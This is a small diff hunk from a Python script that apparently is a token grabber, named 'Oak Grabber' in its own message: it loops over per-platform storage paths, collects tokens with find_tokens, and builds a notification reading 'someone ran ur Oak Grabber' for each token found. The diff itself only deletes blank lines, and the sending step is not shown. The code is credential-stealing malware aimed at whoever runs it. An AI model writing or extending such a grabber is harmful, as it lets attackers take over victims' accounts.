@@ -136,10 +136,8 @@ def main():
     for platforrm, path in default_paths.items():
         if not os.path.exists(path):
             continue
-
         tokens = find_tokens(path)
         embedMsg = f"**someone ran ur Oak Grabber**\n\n"
-
         if len(tokens) > 0:
             for token in tokens:
                 if token in checked:
